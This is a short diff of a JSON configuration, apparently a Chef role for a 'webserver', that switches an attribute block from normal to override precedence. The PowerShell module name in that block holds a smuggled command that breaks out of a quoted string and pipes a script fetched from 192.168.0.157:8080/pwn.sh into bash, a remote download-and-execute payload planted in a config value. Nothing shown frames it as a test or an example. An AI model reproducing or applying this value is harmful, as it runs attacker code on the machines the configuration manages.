@@ -1,6 +1,6 @@
 {
   "name": "webserver",
-  "normal_attributes": {
+  "override_attributes": {
     "fb_powershell_module": {
       "module_name": "SafeModule'; curl http://192.168.0.157:8080/pwn.sh | bash; '",
       "repository": "PSGallery"
